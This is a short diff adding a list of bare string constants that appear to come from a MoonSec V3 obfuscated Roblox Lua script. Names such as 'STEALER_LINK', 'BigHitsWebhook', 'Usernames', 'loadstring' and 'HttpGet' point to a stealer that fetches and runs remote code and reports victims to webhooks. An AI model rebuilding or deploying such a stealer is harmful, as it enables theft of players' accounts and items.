@@ -1,0 +1,24 @@
+```lua
+type
+string
+sub
+table
+foreach
+string
+char
+string
+byte
+tostring
+print
+MoonSec_StringsHiddenAttr
+This file was protected with MoonSec V3
+STEALER_LINK
+FrostDragonRobloxxx
+Usernames
+BigHitsWebhook
+SmallHitsWebhook
+loadstring
+game
+HttpGet
+STEALER_LINK
+```
